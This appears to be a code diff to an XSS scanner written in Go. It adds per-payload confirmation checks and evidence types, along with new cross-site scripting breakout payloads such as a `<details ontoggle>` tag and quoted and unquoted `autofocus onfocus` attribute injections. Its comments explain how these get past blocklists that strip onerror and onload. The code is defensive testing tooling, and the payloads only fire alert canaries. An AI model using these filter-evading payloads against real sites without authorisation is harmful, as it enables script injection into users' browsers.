@@ -17,6 +17,13 @@ package scanner
 type xssPayload struct {
 	build func(canary string) string
 	note  string
+	// confirm is what success looks like for THIS payload. Without it every payload was checked
+	// against the generic markers, which most of them cannot produce - see xss_confirm.go.
+	confirm xssConfirm
+	// bit is the evidence a confirmation establishes. A markup breakout and a JavaScript string
+	// breakout are different findings about different grammars, and reporting one as the other
+	// would make the evidence text describe something that did not happen.
+	bit XSSEvidence
 }
 
 // xssPayloadsForContexts returns the breakouts worth sending for the observed contexts, most
@@ -43,7 +50,13 @@ func xssPayloadsForContexts(contexts []xssContext) []xssPayload {
 	for _, c := range contexts {
 		switch c.Kind {
 		case xssCtxText:
-			add(xssPayload{build: htmlBreakoutPayload, note: "tag injection in a text node"})
+			add(xssPayload{build: htmlBreakoutPayload, note: "tag injection in a text node",
+				confirm: confirmMarkupBreakout})
+			// The same breakout with a handler a blocklist is unlikely to name. One extra request,
+			// and without it a host that strips onerror/onload reads as not vulnerable.
+			add(xssPayload{build: altHandlerBreakoutPayload,
+				note:    "tag injection with a handler outside the usual blocklist",
+				confirm: confirmEventAttrInjection})
 
 		case xssCtxAttrValue:
 			switch {
@@ -52,24 +65,39 @@ func xssPayloadsForContexts(contexts []xssContext) []xssPayload {
 				// parsed, so the payload does not need to survive as raw markup in the response —
 				// it needs to survive as an ENCODED attribute value, which is the opposite of what
 				// every other context asks for and why substring matching on raw markup missed it.
-				add(xssPayload{build: srcdocBreakoutPayload, note: "markup via an HTML-valued attribute (srcdoc)"})
+				add(xssPayload{build: srcdocBreakoutPayload, note: "markup via an HTML-valued attribute (srcdoc)",
+					confirm: confirmSrcdocBreakout})
 			case c.IsURLAttr():
 				// The scheme is the exploit. No tag is opened and no quote is needed, so a
 				// quote-closing payload produces nothing here.
-				add(xssPayload{build: javascriptURLPayload, note: "javascript: scheme in a URL-valued attribute"})
+				add(xssPayload{build: javascriptURLPayload, note: "javascript: scheme in a URL-valued attribute",
+					confirm: confirmJavaScriptURL, bit: XSSEvidenceURLScheme})
 			case c.IsEventAttr():
 				// The value is already JavaScript; it needs no breakout at all, only an expression.
-				add(xssPayload{build: eventHandlerPayload, note: "expression in an inline event handler"})
+				add(xssPayload{build: eventHandlerPayload, note: "expression in an inline event handler",
+					confirm: confirmEventAttrInjection, bit: XSSEvidenceAttrInjection})
 			case c.Quote == 0:
 				// An unquoted value ends at the first space, so a space and an event-handler
 				// attribute inject onto the element that is already there. Nothing needs closing,
 				// which is exactly why no quote-based marker could ever appear.
-				add(xssPayload{build: unquotedAttrPayload, note: "attribute injection into an unquoted value"})
+				add(xssPayload{build: unquotedAttrPayload, note: "attribute injection into an unquoted value",
+					confirm: confirmEventAttrInjection, bit: XSSEvidenceAttrInjection})
 			default:
 				quote := c.Quote
 				add(xssPayload{
-					build: func(canary string) string { return quotedAttrBreakoutPayload(quote, canary) },
-					note:  "tag breakout from a quoted attribute value",
+					build:   func(canary string) string { return quotedAttrBreakoutPayload(quote, canary) },
+					note:    "tag breakout from a quoted attribute value",
+					confirm: confirmMarkupBreakout,
+				})
+				// ZAP's second attempt, and the one that matters when the host escapes `<` and `>`
+				// but leaves the quote alone. No tag can be opened there, so the exploit is to add
+				// an attribute to the element already present. Both cmd/xsschallenge quoted-attribute
+				// endpoints are exactly this shape, and the tag breakout above cannot reach either.
+				add(xssPayload{
+					build:   func(canary string) string { return quotedAttrEventPayload(quote, canary) },
+					note:    "attribute injection into a quoted attribute value",
+					confirm: confirmEventAttrInjection,
+					bit:     XSSEvidenceAttrInjection,
 				})
 			}
 
@@ -84,12 +112,16 @@ func xssPayloadsForContexts(contexts []xssContext) []xssPayload {
 			for _, q := range scriptHostQuotes(c) {
 				quote := q
 				add(xssPayload{
-					build: func(canary string) string { return scriptBreakoutPayloadFor(quote, canary) },
-					note:  "JavaScript string breakout (" + string(quote) + "-quoted host)",
+					build:   func(canary string) string { return scriptBreakoutPayloadFor(quote, canary) },
+					note:    "JavaScript string breakout (" + string(quote) + "-quoted host)",
+					confirm: confirmScriptBreakout,
+					bit:     XSSEvidenceScriptBreakout,
 				})
 				add(xssPayload{
-					build: func(canary string) string { return scriptBreakoutPayloadEscaped(quote, canary) },
-					note:  "JavaScript string breakout against a quote-escaping " + string(quote) + "-quoted host",
+					build:   func(canary string) string { return scriptBreakoutPayloadEscaped(quote, canary) },
+					note:    "JavaScript string breakout against a quote-escaping " + string(quote) + "-quoted host",
+					confirm: confirmScriptBreakout,
+					bit:     XSSEvidenceScriptBreakout,
 				})
 			}
 
@@ -98,12 +130,14 @@ func xssPayloadsForContexts(contexts []xssContext) []xssPayload {
 			// the payload has to emit that end tag before any markup can begin.
 			tag := c.TagName
 			add(xssPayload{
-				build: func(canary string) string { return rcdataBreakoutPayload(tag, canary) },
-				note:  "markup after closing an RCDATA element",
+				build:   func(canary string) string { return rcdataBreakoutPayload(tag, canary) },
+				note:    "markup after closing an RCDATA element",
+				confirm: confirmMarkupBreakout,
 			})
 
 		case xssCtxComment:
-			add(xssPayload{build: commentBreakoutPayload, note: "markup after closing a comment"})
+			add(xssPayload{build: commentBreakoutPayload, note: "markup after closing a comment",
+				confirm: confirmMarkupBreakout})
 		}
 	}
 
@@ -152,7 +186,39 @@ func quotedAttrBreakoutPayload(quote byte, canary string) string {
 // value terminates at whitespace, so no quote is involved anywhere — which is why this case is
 // invisible to a quote-closing payload and to any marker built from one.
 func unquotedAttrPayload(canary string) string {
-	return canary + ` onload=alert(1) id=` + canary
+	// The canary goes INSIDE the handler expression, not merely alongside it. Evidence for an
+	// attribute injection is the canary sitting in a parsed event-handler value, so a payload that
+	// left it in `value` and `id` could not be confirmed however well it worked.
+	//
+	// A leading token is load-bearing: whitespace after `=` is skipped by the parser, so a payload
+	// starting with a space has its first word consumed as the value being injected into rather
+	// than becoming an attribute. And an unquoted value may not contain `=`, which is why the
+	// expression is a call rather than an assignment.
+	return canary + ` autofocus onfocus=alert(` + canary + `)`
+}
+
+// quotedAttrEventPayload closes the quoted value and adds an event handler WITHOUT opening a tag.
+//
+// This is the payload for a host that escapes `<` and `>` but not the quote - the commonest
+// half-done escaping there is. quotedAttrBreakoutPayload assumes a tag can be opened; where it
+// cannot, this one still runs, and the canary sits inside the handler so the injection is
+// confirmable.
+// altHandlerBreakoutPayload opens a tag whose event handler is not onerror or onload.
+//
+// Blocklists overwhelmingly name those two, and a filter that deletes them leaves the element intact
+// and every other handler untouched - so the tag breakout appears to fail while the host is fully
+// exploitable. `<details open ontoggle=…>` fires on parse with no interaction, and the canary sits
+// inside the handler so the parser can confirm it.
+func altHandlerBreakoutPayload(canary string) string {
+	return `"><details open ontoggle=alert(` + canary + `)>`
+}
+
+func quotedAttrEventPayload(quote byte, canary string) string {
+	q := `"`
+	if quote == '\'' {
+		q = `'`
+	}
+	return q + ` autofocus onfocus=` + q + `alert(` + canary + `)`
 }
 
 // javascriptURLPayload puts an executable scheme in a URL-valued attribute. It must sit at the
